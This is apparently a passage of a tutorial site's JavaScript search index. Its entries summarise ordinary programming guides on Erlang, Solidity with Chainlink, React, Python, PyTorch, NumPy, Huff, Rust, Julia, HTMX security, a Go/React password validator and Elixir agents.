+ Number2. Example: Using OTP Design Principles linkSupervisor and Worker Example link -module(my_supervisor). -behaviour(supervisor). -export([start_link/0, init/1]). start_link() -\u003e supervisor:start_link({local, ?MODULE}, ?MODULE, []). init([]) -\u003e {ok, {{one_for_one, 5, 10}, [{my_worker, {my_worker, start_link, []}, permanent, 5000, worker, [my_worker]}]}}. -module(my_worker). -behaviour(gen_server). -export([start_link/0, init/1, handle_call/3, handle_cast/2, terminate/2, code_change/3]). start_link() -\u003e gen_server:start_link({local, ?MODULE}, ?MODULE, [], []). init([]) -\u003e {ok, #state{}}. handle_call(_Request, _From, State) -\u003e {reply, ok, State}. handle_cast(_Msg, State) -\u003e {noreply, State}. terminate(_Reason, _State) -\u003e ok. code_change(_OldVsn, State, _Extra) -\u003e {ok, State}. In this example, we define a supervisor (my_supervisor) and a worker (my_worker). The supervisor is responsible for starting and monitoring the worker processes, ensuring that they are restarted if they fail.\nConclusion linkUnderstanding and applying best practices in Erlang programming helps in building robust, scalable, and maintainable systems. By learning from real-world applications and adhering to recommended practices, developers can leverage Erlang’s full potential in creating high-availability systems.\n"
            }
        );
    index.add(
            {
                id:  204 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/price_oracle_using_chainlink_and_solidity\/",
                title: "Price Oracle Using Chainlink and Solidity",
                description: "Get access to price feed ofchain using solidity and chainlink.",
                content: "One application of Solidity is in decentralized finance (DeFi) and obtaining accurate and reliable price data is crucial for various operations such as asset valuation, trading, and lending. Chainlink, a decentralized oracle network, provides a solution to this problem by offering decentralized price oracles. In this section, we’ll explore a Solidity contract that interacts with a Chainlink price oracle to fetch the latest ETH/USD price.\nChainlink price oracles are decentralized services that provide tamper-resistant price data to smart contracts on the blockchain. These oracles fetch data from multiple trusted sources, aggregate it, and make it available on-chain for various use cases.\nContract Overview linkLet’s dissect the Solidity contract ChainlinkPriceOracle:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.24; contract ChainlinkPriceOracle { AggregatorV3Interface internal priceFeed; constructor() { // ETH / USD priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419); } function getLatestPrice() public view returns (int256) { ( uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound ) = priceFeed.latestRoundData(); // for ETH / USD price is scaled up by 10 ** 8 return price / 1e8; } } interface AggregatorV3Interface { function latestRoundData() external view returns ( uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound ); } Explaining the Contract link Contract Initialization:\nconstructor() { // ETH / USD priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419); } In the constructor, the contract initializes the priceFeed variable with the address of the Chainlink aggregator contract for the ETH/USD price feed. Fetching Latest Price:\nfunction getLatestPrice() public view returns (int256) { ( uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound ) = priceFeed.latestRoundData(); // for ETH / USD price is scaled up by 10 ** 8 return price / 1e8; } The getLatestPrice function fetches the latest ETH/USD price from the Chainlink aggregator contract. It calls the latestRoundData function of the priceFeed interface, which returns various information including the latest price. Since the price is scaled up by 10^8 in the Chainlink aggregator contract, we divide it by 1e8 to get the actual price. Aggregator Interface:\ninterface AggregatorV3Interface { function latestRoundData() external view returns ( uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound ); } Defines the interface for interacting with Chainlink price aggregator contracts. It specifies the latestRoundData function, which returns various details including the latest price. Conclusion linkThe ChainlinkPriceOracle contract demonstrates how to integrate Chainlink’s decentralized price oracles into Solidity smart contracts. By utilizing Chainlink’s trusted price data, developers can build DeFi applications that rely on accurate and reliable price feeds for their operations. This contract serves as a foundational piece in the ecosystem of decentralized finance, enabling secure and transparent financial transactions on the blockchain.\n"
            }
        );
    index.add(
            {
                id:  205 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/progres_checker\/",
                title: "Progress Tracker using React and Local Storage",
                description: "How to install and use libraries",
                content: "Overview linkA Progress Tracker is a basic web application that lists tasks to be completed. Users can mark tasks as completed, and their progress is stored using the browser’s local storage. The application includes a progress bar to display overall progress.\nPreview of Final Output link Technologies Used / Prerequisites link ReactJs Tailwind CSS JSX Functional Components in React React Hooks Local Storage Approach link Containers: Stateful React components (class-based). Components: Stateless React Components (function-based). We used React Functional Components and React Hooks (specifically useState and useEffect) to build the website. Components are written in JSX to render the UI and logic. All work is done using React, which operates on JavaScript. Project Structure link src/ |-- components/ | |-- DSAList.js | |-- Section.js | `-- SubSection.js |-- utils/ | |-- calculateProgress.js | `-- dsaTrackerList.js |-- App.js |-- index.js |-- index.html Steps to Create the Project linkStep 1: Set Up React Project link npx create-react-app progress-tracker Step 2: Navigate to the Project Folder link cd progress-tracker Step 3: Create Folder Structure link Create a components folder for storing components. Create a utils folder for utility functions and initial state. Step 4: Add Tailwind CSS linkAdd the following script tag in the index.html:\nCode Implementation linkindex.html linkAutomatically created file where we need to import the Tailwind CSS tag.\nindex.js linkAutomatically created which React uses for final rendering.\nApp.js linkThis file imports the DSAList component and exports it along with exporting the headings and name of the app.\nimport DSAList from \"./components/DSAList\"; export default function App() { return ( GeeksforGeeks DSA Tracker ); } DSAList.js linkThis file contains the overall logic of the website and all the required components.\nimport { useState, useEffect } from \"react\"; import { findSectionProgress, findOverallProgress } from \"../utils/calculateProgress\"; import dsaTrackerList from \"../utils/dsaTrackerList\"; import Section from \"./Section\"; export default function DSAList() { const [dsaList, setDsaList] = useState([]); const [overallProgress, setOverallProgress] = useState(0); useEffect(() =\u003e { const localList = JSON.parse(localStorage.getItem(\"dsalist\")) || []; setDsaList(localList.length !== 0 ? localList : dsaTrackerList); }, []); useEffect(() =\u003e { setOverallProgress(findOverallProgress(dsaList)); }, [dsaList]); const updateList = (index, indexOfSub) =\u003e { const newDSAList = [...dsaList]; newDSAList[index].subsections[indexOfSub].completed = !newDSAList[index].subsections[indexOfSub].completed; newDSAList[index].progress = findSectionProgress(newDSAList[index].subsections); setDsaList(newDSAList); localStorage.setItem(\"dsalist\", JSON.stringify(newDSAList)); }; return ( {overallProgress === 100 \u0026\u0026 Successfully Completed! Hurray.} Progress: {overallProgress}%\n{dsaList.map((section, index) =\u003e ( ))} ); } Section.js linkThis component defines the UI and logic of individual sections.\nimport { useState } from \"react\"; import SubSection from \"./SubSection\"; export default function Section({ section, index, updateList }) { const [open, setOpen] = useState(false); return ( "
            }
        );
    index.add(
            {
                id:  206 ,
                href: "\/tutorials\/docs\/python\/",
                title: "Python",
                description: "The syntax of a programming language is a set of rules that defines how a program is written and interpreted. In Python, syntax is famously clean and often feels intuitive, making it an excellent choice for beginners. Yet, it possesses the depth required for advanced programming. This section explores Python syntax through various constructs and a practical example.",
                content: ""
            }
        );
    index.add(
            {
                id:  207 ,
                href: "\/tutorials\/docs\/python\/python\/python_modules_and_packages\/",
                title: "Python Modules and Packages: Importing Essentials and Exploring Standard Libraries",
                description: "Deep dive into Python's modular approach with a focus on importing modules and leveraging the capabilities of standard libraries such as math and datetime. This guide offers detailed insights and examples to enhance your programming efficiency.",
                content: "Introduction linkModules in Python are simply files containing Python code that can be imported into other Python scripts or modules. They are the building blocks of larger Python programs and make it easy to organize and reuse code across different projects. Packages are a way of structuring Python’s module namespace by using “dotted module names”.\nImporting Modules linkImporting modules is fundamental in Python as it allows you to use functionalities that are not built into the core language but are vital for your programs.\nBasic Import link # Importing a single module import math print(\"The value of pi is:\", math.pi) Here, the math module is imported, and we access its pi attribute to get the mathematical constant π.\nImporting Specific Functions link # Importing specific attributes or functions from math import sqrt, cos print(\"Square root of 16 is:\", sqrt(16)) print(\"Cosine of 90 degrees is:\", cos(90)) This method allows you to directly use sqrt and cos without the math. prefix, making the code cleaner and potentially more efficient.\nImporting with Aliases link # Importing modules with an alias import datetime as dt current_time = dt.datetime.now() print(\"Current time:\", current_time) Using aliases (e.g., dt) can shorten your code and improve readability when dealing with modules having longer names.\nExploring Standard Modules linkPython’s standard library is vast, but let’s explore two commonly used modules: math for mathematical tasks and datetime for handling date and time.\nThe math Module link # Using functions from the math module import math angle = math.radians(90) # Convert degrees to radians print(\"Sine of 90 degrees is:\", math.sin(angle)) The math module provides access to mathematical functions like sin, cos, tan, and much more, which are crucial for scientific calculations.\nThe datetime Module link # Working with the datetime module from datetime import datetime, timedelta now = datetime.now() print(\"Now:\", now) # Calculating future dates future_date = now + timedelta(days=10) print(\"Date after 10 days:\", future_date) datetime helps manage dates and times in Python, from simple tasks like getting the current date and time to complex manipulations such as calculating differences between dates.\nConclusion linkModules and packages are integral to Python programming, providing structured and reusable code that can greatly enhance productivity and maintainability of projects. By understanding how to import and utilize these, you can tap into an extensive range of functionalities that Python and its community offer.\nThis guide has aimed to provide a thorough understanding of modules and packages in Python, equipped with practical examples to illustrate their use in real-world scenarios. If you need more in-depth information or additional examples on specific modules or package management, please let me know!\n"
            }
        );
    index.add(
            {
                id:  208 ,
                href: "\/tutorials\/docs\/pytorch\/",
                title: "pytorch",
                description: "PyTorch is a popular open-source machine learning library developed by Facebook's AI Research lab (FAIR). Known for its flexibility, ease of use, and dynamic computational graphs, PyTorch has become a go-to framework for both research and production in the field of deep learning.",
                content: ""
            }
        );
    index.add(
            {
                id:  209 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/data_loading_and_preprocessing\/",
                title: "PyTorch: Data Loading and Preprocessing",
                description: "Understanding Data Loading and Preprocessing in PyTorch.",
                content: "Introduction to Data Loading and Preprocessing linkData loading and preprocessing are crucial steps in the machine learning pipeline. PyTorch provides tools and utilities to efficiently load and preprocess datasets for training, validation, and testing. In this tutorial, we’ll explore various techniques for data loading and preprocessing using PyTorch.\nDataset Classes in PyTorch linkPyTorch provides a torch.utils.data.Dataset class for representing datasets. To work with custom datasets, you can subclass Dataset and implement the __len__ and __getitem__ methods. These methods allow you to specify the length of the dataset and access individual samples, respectively.\nExample: Custom Dataset Class link import torch from torch.utils.data import Dataset class CustomDataset(Dataset): def __init__(self, data, targets): self.data = data self.targets = targets def __len__(self): return len(self.data) def __getitem__(self, idx): sample = {'data': self.data[idx], 'target': self.targets[idx]} return sample Data Loading with DataLoader linkOnce you have defined a dataset, you can use the torch.utils.data.DataLoader class to create an iterable over the dataset. Data loaders provide features such as batching, shuffling, and parallel data loading, making them efficient for training neural networks.\nExample: Using DataLoader link from torch.utils.data import DataLoader # Create a custom dataset dataset = CustomDataset(data, targets) # Create a data loader dataloader = DataLoader(dataset, batch_size=64, shuffle=True) Preprocessing Techniques linkPreprocessing is an essential step in data preparation, and PyTorch offers various tools for preprocessing data efficiently.\nData Augmentation linkData augmentation is a technique used to increase the diversity of training data by applying random transformations such as rotation, scaling, and flipping. PyTorch provides the torchvision.transforms module for implementing data augmentation pipelines.\nimport torchvision.transforms as transforms # Define data augmentation transformations transform = transforms.Compose([ transforms.RandomHorizontalFlip(), transforms.RandomRotation(10), transforms.ToTensor(), ]) Loading Image Data linkPyTorch provides support for loading image datasets using the torchvision.datasets.ImageFolder class. This class assumes that images are stored in a folder structure, where each subfolder represents a class.\nExample: Loading Image Data link from torchvision.datasets import ImageFolder import torchvision.transforms as transforms # Define data transformation transform = transforms.Compose([ transforms.Resize((224, 224)), transforms.ToTensor(), ]) # Load image dataset dataset = ImageFolder(root='data/', transform=transform) Conclusion linkData loading and preprocessing are essential steps in building machine learning models. PyTorch provides powerful tools and utilities for efficiently loading and preprocessing data, enabling you to focus on developing and training your models effectively.\n"
            }
        );
    index.add(
            {
                id:  210 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/random_number_generation_and_sampling\/",
                title: "Random Number Generation and Sampling with NumPy",
                description: "...",
                content: "Introduction linkRandom number generation and sampling are essential tasks in various scientific and computational applications. NumPy provides a powerful suite of functions for generating random numbers and sampling from different probability distributions. In this tutorial, we’ll explore how to generate random numbers, create random arrays, and sample from different distributions using NumPy.\n1. Generating Random Numbers link1.1 Generating a Single Random Number\nimport numpy as np # Generate a single random number between 0 and 1 random_number = np.random.rand() print(\"Random number between 0 and 1:\", random_number) 1.2 Generating an Array of Random Numbers\n# Generate an array of random numbers of shape (3, 3) between 0 and 1 random_array = np.random.rand(3, 3) print(\"Array of random numbers between 0 and 1:\\n\", random_array) 1.3 Generating Random Integers\n# Generate a random integer between 1 and 10 random_int = np.random.randint(1, 11) print(\"Random integer between 1 and 10:\", random_int) 2. Sampling from Probability Distributions link2.1 Uniform Distribution\n# Sample 5 random numbers from a uniform distribution between 0 and 1 uniform_samples = np.random.uniform(0, 1, 5) print(\"Uniformly distributed random samples:\", uniform_samples) 2.2 Normal Distribution\n# Sample 5 random numbers from a normal distribution with mean 0 and standard deviation 1 normal_samples = np.random.normal(0, 1, 5) print(\"Normally distributed random samples:\", normal_samples) 2.3 Binomial Distribution\n# Sample 5 random numbers from a binomial distribution with 10 trials and probability of success 0.5 binomial_samples = np.random.binomial(10, 0.5, 5) print(\"Binomially distributed random samples:\", binomial_samples) 2.4 Custom Distribution\n# Sample 5 random numbers from a custom distribution custom_distribution = [0.1, 0.2, 0.3, 0.4, 0.5] custom_samples = np.random.choice(custom_distribution, 5) print(\"Custom distributed random samples:\", custom_samples) 3. Seeding Randomness link # Seed the random number generator for reproducibility np.random.seed(42) # Generate random numbers after seeding random_array = np.random.rand(3, 3) print(\"Random array with seed 42:\\n\", random_array) Conclusion linkRandom number generation and sampling are crucial components of many computational tasks. NumPy’s random module provides a wide range of functions for generating random numbers and sampling from various probability distributions. By understanding these functions and their parameters, you can generate random data tailored to your specific needs, enabling you to perform statistical simulations, model testing, and more with ease.\nThis tutorial should give you a solid foundation in random number generation and sampling using NumPy, empowering you to incorporate randomness into your computational tasks effectively.\n"
            }
        );
    index.add(
            {
                id:  211 ,
                href: "\/tutorials\/docs\/huff\/huff\/reverse_calldata_with_huff\/",
                title: "Reversing Calldata with Huff: A Step-by-Step Tutorial",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Introduction linkIn this tutorial, we’ll explore the process of writing a Huff smart contract that reverses the calldata it receives. Calldata is a type of input data sent along with a transaction, stored outside the EVM’s storage and memory, making it cheaper to use.\nOur goal is to create a contract that, upon receiving data, returns the same data in reverse order.\nThe task is to write a Huff smart contract that reverses the calldata it receives. When data is sent to this contract, it should return the same data but in reverse order.\nSolution linkThere are multiple valid solutions to this challenge.\n#define constant NEG1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff #define macro GET_CALLDATA_BYTE() = takes(1) returns(1) { calldataload 0xf8 shr } #define macro MAIN() = takes(0) returns(0) { calldatasize not_empty jumpi returndatasize returndatasize return not_empty: calldatasize returndatasize copy_bytes_iter: // [i, j + 1] swap1 // [j + 1, i] [NEG1] add // [j, i] dup2 dup2 // [j, i, j, i] dup2 GET_CALLDATA_BYTE() // [cd[i], j, i, j, i] dup2 GET_CALLDATA_BYTE() // [cd[j], cd[i], j, i, j, i] swap2 // [j, cd[i], cd[j], i, j, i] mstore8 // [cd[j], i, j, i] swap1 mstore8 // [j, i] swap1 0x1 add // [i', j' + 1] dup2 dup2 // [i', j' + 1, i', j' + 1] lt copy_bytes_iter jumpi calldatasize returndatasize return } Breakdown of the Contract linkLet’s break down the solution into manageable parts.\nConstant Definition linkFirstly, we define a constant NEG1, which is a 256-bit number representing -1 in two’s complement form. This constant will be useful for offsetting indexes.\n#define constant NEG1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff Calldata Byte Retrieval Macro linkNext, we define a macro called GET_CALLDATA_BYTE(). This macro fetches one byte of calldata at a specified index. The calldataload opcode loads 32 bytes of calldata from a specific index, but we’re only interested in a single byte, so we shift right (shr) by 248 bits (0xf8) to isolate the byte we need.\n#define macro GET_CALLDATA_BYTE() = takes(1) returns(1) { calldataload 0xf8 shr } Main Macro linkNext comes the MAIN() macro. The first part of MAIN() checks whether any calldata is present:\n#define macro MAIN() = takes(0) returns(0) { calldatasize not_empty jumpi returndatasize returndatasize return Here, calldatasize gets the size of the calldata. If the size is non-zero (meaning calldata is present), control jumps to the not_empty label. If the size is zero (no calldata), it immediately returns.\nAfter confirming that calldata is present, the size of the calldata is fetched and pushed to the stack.\nnot_empty: calldatasize returndatasize Reversing Calldata Logic linkThe most intricate part is the logic to reverse the calldata, one byte at a time. Let’s divide the copy_bytes_iter block into smaller chunks and discuss each one.\nBlock 1: Index Preparation and Byte Retrieval link copy_bytes_iter: // [i, j + 1] swap1 // [j + 1, i] [NEG1] add // [j, i] dup2 dup2 // [j, i, j, i] dup2 GET_CALLDATA_BYTE() // [cd[i], j, i, j, i] dup2 GET_CALLDATA_BYTE() // [cd[j], cd[i], j, i, j, i] In this first block, we prepare the indices and retrieve the bytes to be swapped. We first swap i and j + 1 then subtract 1 from j + 1 to get j. After duplicating j and i for later use, the GET_CALLDATA_BYTE() macro is invoked twice to get the ith and jth bytes (cd[i] and cd[j]) from the calldata.\nBlock 2: Byte Swapping link swap2 // [j, cd[i], cd[j], i, j, i] mstore8 // [cd[j], i, j, i] swap1 mstore8 // [j, i] In the second block, the swapping of the bytes takes place. The contract swaps cd[i] and j, then uses mstore8 to store cd[j] at the ith position and cd[i] at the jth position. At the end of this block, j and i are left on the stack.\nBlock 3: Loop Iteration and Continuation link swap1 0x1 add // [i', j' + 1] dup2 dup2 // [i', j' + 1, i', j' + 1] lt copy_bytes_iter jumpi In the third block, i is incremented to move on to the next byte from the start. The indices i' and j' + 1 are then duplicated for comparison. If i' is less than j' + 1, the loop continues and jumps back to copy_bytes_iter. Otherwise, the loop terminates, and the contract proceeds to the next stage.\nBy repeating these steps, the copy_bytes_iter block swaps all pairs of bytes in the calldata until all bytes are reversed.\nFinal Return linkAfter completing the reversal of calldata, the contract returns the reversed data:\ncalldatasize returndatasize return This completes the reversal process and outputs the reversed calldata.\nConclusion linkIn this tutorial, we’ve seen how to write a Huff smart contract that reverses calldata. By breaking down the problem and implementing the solution step by step, we successfully created a contract that meets the challenge requirements. This approach can be adapted and expanded to handle more complex data manipulation tasks within the EVM using Huff.\n"
            }
        );
    index.add(
            {
                id:  212 ,
                href: "\/tutorials\/docs\/rust\/rust\/robust_error_handling_rust\/",
                title: "Robust Error Handling in Rust: Using Result and Option",
                description: "Dive deep into Rust’s error handling mechanisms, exploring the `Result` and `Option` types, and advanced error propagation techniques. This comprehensive guide is packed with technical insights, practical coding examples, and best practices aimed at mastering error management in Rust programming.",
                content: "Introduction linkError handling is a critical aspect of software development, and Rust provides robust tools to manage errors in a safe and efficient manner. Unlike many programming languages that use exceptions, Rust uses the Result and Option types to handle potential errors and the absence of values explicitly. This post explores these types, along with sophisticated error propagation techniques, to help you write reliable and maintainable Rust code.\nUnderstanding Result and Option Types linkThe Result and Option types are enums defined by the Rust standard library, and they are fundamental to error handling in Rust applications.\nOption Type:\nenum Option { Some(T), None, } The Option type is used when a value may or may not be present. Some(T) wraps a value T when it exists, and None indicates the absence of a value.\nExample of Using Option:\nfn find_divisor(number: i32) -\u003e Option { for i in 2..number { if number % i == 0 { return Some(i); // A divisor is found. } } None // No divisor found. } This function returns an Option indicating whether a divisor was found for the given number.\nResult Type:\nenum Result { Ok(T), Err(E), } The Result type is utilized for operations that can result in an error. It returns Ok(T) if the operation is successful and Err(E) if it fails, where E is the error type.\nExample of Using Result:\nfn divide(numerator: f64, denominator: f64) -\u003e Result { if denominator == 0.0 { Err(String::from(\"Division by zero error\")) } else { Ok(numerator / denominator) } } This function attempts to perform division and uses Result to indicate success or an error.\nError Propagation Techniques linkEffective error handling in Rust also involves propagating errors from where they occur to where they can be handled appropriately. Rust provides several techniques to streamline error propagation.\nUsing ? Operator for Concise Error Propagation: The ? operator is a shorthand for propagating errors up the call stack. It simplifies handling errors in functions that return a Result.\nfn perform_division() -\u003e Result { let numerator = 10.0; let denominator = 0.0; let result = divide(numerator, denominator)?; Ok(result) } Here, the ? operator automatically handles the error, returning early if divide results in an Err.\nCombining match and Result: In scenarios where you need more control over error handling than the ? operator allows, match can be used to unpack the Result manually.\nmatch divide(10.0, 2.0) { Ok(result) =\u003e println!(\"Result: {}\", result), Err(e) =\u003e println!(\"Error: {}\", e), } This provides flexibility in handling different outcomes of the divide function.\nBest Practices in Error Handling link Use Result for Expected Errors: Employ Result when an error is a foreseeable outcome of a routine operation, such as file I/O or network requests.\nLeverage Option for Optional Values: Use Option when a value may legitimately be absent without it being due to an error, such as retrieving an element from a collection.\nDocument Error Conditions: Clearly document the errors your functions can return, making it easier for others to use your code correctly.\nConclusion linkUnderstanding and effectively utilizing the Result and Option types are foundational to robust error handling in Rust. By embracing these constructs and using the appropriate error propagation techniques, you can enhance the reliability and maintainability of your Rust applications. In subsequent posts, we will explore more advanced error handling patterns and practices to further refine your Rust programming skills.\n"
            }
        );
    index.add(
            {
                id:  213 ,
                href: "\/tutorials\/docs\/rust\/",
                title: "Rust",
                description: "Best Rust blogs out there.",
                content: ""
            }
        );
    index.add(
            {
                id:  214 ,
                href: "\/tutorials\/docs\/scala\/",
                title: "Scala",
                description: "Scala, an acronym for Scalable Language, is a modern, multi-paradigm programming language designed to express common programming patterns in a concise, elegant, and type-safe way. It smoothly integrates features of object-oriented and functional languages.",
                content: ""
            }
        );
    index.add(
            {
                id:  215 ,
                href: "\/tutorials\/docs\/julia\/julia\/scientific_computing\/",
                title: "Scientific Computing with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "Scientific Computing linkJulia is particularly well-suited for scientific computing due to its high performance and ease of writing complex mathematical operations. This section will introduce key aspects of scientific computing in Julia, including linear algebra operations and interfacing with other languages.\nJulia in Scientific Computing linkJulia’s syntax is concise and readable, making it ideal for mathematical expressions. Its performance is comparable to traditional scientific computing languages like Fortran and C, thanks to its just-in-time (JIT) compilation.\nWorking with Linear Algebra linkJulia provides extensive support for linear algebra. Common operations like matrix multiplication, eigenvalues, and singular value decomposition are straightforward to implement.\nExample of linear algebra operations:\nusing LinearAlgebra # Creating matrices A = [1 2; 3 4] B = [5 6; 7 8] # Matrix multiplication C = A * B println(\"Matrix C: \") println(C) # Calculating eigenvalues eigenvalues = eigen(A).values println(\"Eigenvalues of A: \", eigenvalues) Interfacing with Other Languages linkOne of Julia’s strengths is its ability to interface seamlessly with other languages. This is particularly useful in scientific computing where leveraging existing libraries and codebases is common.\nExample of calling a Python function from Julia:\nusing PyCall # Accessing Python's math library math = pyimport(\"math\") # Using Python's sqrt function result = math.sqrt(16) println(\"Square root of 16: \", result) Code Example: Basic Scientific Computation linkHere’s a simple example demonstrating Julia’s capabilities in scientific computation:\n# Using Julia for scientific computation # Function to calculate the area of a circle function circle_area(radius) return π * radius^2 end # Calculate and print the area radius = 5 area = circle_area(radius) println(\"Area of the circle with radius \", radius, \" is \", area) This example covers basic mathematical operations and the use of constants like π in Julia.\n"
            }
        );
    index.add(
            {
                id:  216 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/security_in_htmx\/",
                title: "Security in HTMX",
                description: "Learn about what HTMX is and how you can use it.",
                content: "htmx allows you to define logic directly in your DOM. This has a number of advantages, the largest being Locality of Behavior, which makes your system easier to understand and maintain.\nA concern with this approach, however, is security: since htmx increases the expressiveness of HTML, if a malicious user is able to inject HTML into your application, they can leverage this expressiveness of htmx to malicious ends.\nRule 1: Escape All User Content linkThe first rule of HTML-based web development has always been: do not trust input from the user. You should escape all 3rd party, untrusted content that is injected into your site. This is to prevent, among other issues, XSS attacks.\nThere is extensive documentation on XSS and how to prevent it on the excellent OWASP Website, including a Cross Site Scripting Prevention Cheat Sheet.\nThe good news is that this is a very old and well understood topic, and the vast majority of server-side templating languages support automatic escaping of content to prevent just such an issue.\nThat being said, there are times people choose to inject HTML more dangerously, often via some sort of raw() mechanism in their templating language. This can be done for good reasons, but if the content being injected is coming from a 3rd party then it must be scrubbed, including removing attributes starting with hx- and data-hx, as well as inline "
            }
        );
    index.add(
            {
                id:  217 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/password_validator\/",
                title: "Simple Password Validator using React + Go",
                description: "How to install and use libraries",
                content: "Building a Password Validation Tool with Go and React linkIn this blog post, we’ll walk you through creating a simple yet powerful password validation tool using Go for the backend and React for the frontend. This tutorial will cover everything from setting up the server, implementing password validation logic, and building a responsive client interface to test the password strength.\nTable of Contents link Introduction Setting Up the Server Installing Dependencies Writing the main.go File Implementing Password Validation Logic Creating the React Client Setting Up the React Project Writing the App.js File Testing the Application Conclusion 1. Introduction linkPassword security is a crucial aspect of any web application. Ensuring that users create strong passwords can help protect their accounts from being compromised. In this tutorial, we will create a tool that validates password strength based on specific criteria such as length, and the inclusion of lowercase letters, uppercase letters, and numbers.\n2. Setting Up the Server linkFirst, we need to set up the server using Go and the Gin framework.\nInstalling Dependencies linkTo get started, make sure you have Go installed on your machine. Next, install the necessary Go packages:\ngo get -u github.com/gin-gonic/gin go get -u github.com/gin-contrib/cors Writing the main.go File linkCreate a file named main.go and add the following code:\n//Server // main.go package main import ( \"net/http\" \"regexp\" \"github.com/gin-contrib/cors\" \"github.com/gin-gonic/gin\" ) type PasswordRequest struct { Password string `json:\"password\"` } type PasswordResponse struct { IsStrong bool `json:\"isStrong\"` Message string `json:\"message\"` } func validatePassword(password string) (bool, string) { var hasMinLength = regexp.MustCompile(`.{8,}`) var hasLower = regexp.MustCompile(`[a-z]`) var hasUpper = regexp.MustCompile(`[A-Z]`) var hasNumber = regexp.MustCompile(`[0-9]`) if !hasMinLength.MatchString(password) { return false, \"Password must be at least 8 characters long\" } if !hasLower.MatchString(password) { return false, \"Password must have at least one lowercase letter\" } if !hasUpper.MatchString(password) { return false, \"Password must have at least one uppercase letter\" } if !hasNumber.MatchString(password) { return false, \"Password must have at least one number\" } return true, \"Strong password\" } func passwordHandler(c *gin.Context) { var req PasswordRequest if err := c.ShouldBindJSON(\u0026req); err != nil { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) return } isStrong, message := validatePassword(req.Password) res := PasswordResponse{IsStrong: isStrong, Message: message} c.JSON(http.StatusOK, res) } func main() { r := gin.Default() // Configure CORS middleware r.Use(cors.New(cors.Config{ AllowOrigins: []string{\"http://localhost:5173\"}, })) r.POST(\"/validate-password\", passwordHandler) r.Run(\":8080\") } In this code, we set up a basic server using Gin and add an endpoint to validate the password. The validatePassword function checks if the password meets the required criteria.\n3. Implementing Password Validation Logic linkThe validatePassword function uses regular expressions to ensure that the password:\nIs at least 8 characters long Contains at least one lowercase letter Contains at least one uppercase letter Contains at least one number If any of these criteria are not met, it returns a corresponding error message.\n4. Creating the React Client linkNext, we need to create a client using React to interact with our server.\nSetting Up the React Project linkFirst, set up a new React project using Create React App:\nnpm create vite@latest # it will prompt you to create the project name, and choose the framework. Choose React. cd password-validator npm install Writing the App.js File linkReplace the contents of src/App.js with the following code:\nimport React, { useState } from \"react\"; const App = () =\u003e { const [errorMessage, setErrorMessage] = useState(\"\"); const validate = async (value) =\u003e { try { const response = await fetch(\"http://localhost:8080/validate-password\", { method: \"POST\", headers: { \"Content-Type\": \"application/json\", }, body: JSON.stringify({ password: value }), }); const data = await response.json(); if (data.isStrong) { setErrorMessage(\"Is Strong Password\"); } else { setErrorMessage(data.message); } } catch (error) { setErrorMessage(\"Error validating password\"); } }; return ( "
            }
        );
    index.add(
            {
                id:  218 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/simple_state_management\/",
                title: "Simple state management with agents",
                description: "In this guide, we will learn how to keep and share state between multiple entities. If you have previous programming experience, you may think of globally shared variables, but the model we will learn here is quite different. The next chapters will generalize the concepts introduced here.\nThe trouble with (mutable) state linkElixir is an immutable language where nothing is shared by default. If we want to share information, which can be read and modified from multiple places, we have two main options in Elixir:",
                content: "In this guide, we will learn how to keep and share state between multiple entities. If you have previous programming experience, you may think of globally shared variables, but the model we will learn here is quite different. The next chapters will generalize the concepts introduced here.\nThe trouble with (mutable) state linkElixir is an immutable language where nothing is shared by default. If we want to share information, which can be read and modified from multiple places, we have two main options in Elixir:\nUsing processes and message passing ETS (Erlang Term Storage) We covered processes in the Getting Started guide. ETS (Erlang Term Storage) is a new topic that we will explore in later chapters. When it comes to processes though, we rarely hand-roll our own, instead we use the abstractions available in Elixir and OTP:\nAgent — Simple wrappers around state. GenServer — “Generic servers” (processes) that encapsulate state, provide sync and async calls, support code reloading, and more. Task — Asynchronous units of computation that allow spawning a process and potentially retrieving its result at a later time. We will explore most of these abstractions in this guide. Keep in mind that they are all implemented on top of processes using the basic features provided by the VM, like send/2, receive/1, spawn/1 and Process.link/1.\nHere, we will use agents, and create a module named KV.Bucket, responsible for storing our key-value entries in a way that allows them to be read and modified by other processes.\nAgents linkAgents are simple wrappers around state. If all you want from a process is to keep state, agents are a great fit. Let’s start a iex session inside the project with:\niex -S mix And play a bit with agents:\n{:ok, agent} = Agent.start_link(fn -\u003e [] end) {:ok, #PID\u003c0.57.0\u003e} Agent.update(agent, fn list -\u003e [\"eggs\" | list] end) :ok Agent.get(agent, fn list -\u003e list end) [\"eggs\"] Agent.stop(agent) :ok We started an agent with an initial state of an empty list. We updated the agent’s state, adding our new item to the head of the list. The second argument of Agent.update/3 is a function that takes the agent’s current state as input and returns its desired new state. Finally, we retrieved the whole list. The second argument of Agent.get/3 is a function that takes the state as input and returns the value that Agent.get/3 itself will return. Once we are done with the agent, we can call Agent.stop/3 to terminate the agent process.\nThe Agent.update/3 function accepts as a second argument any function that receives one argument and returns a value:\n{:ok, agent} = Agent.start_link(fn -\u003e [] end) {:ok, #PID\u003c0.338.0\u003e} Agent.update(agent, fn _list -\u003e 123 end) :ok Agent.update(agent, fn content -\u003e %{a: content} end) :ok Agent.update(agent, fn content -\u003e [12 | [content]] end) :ok 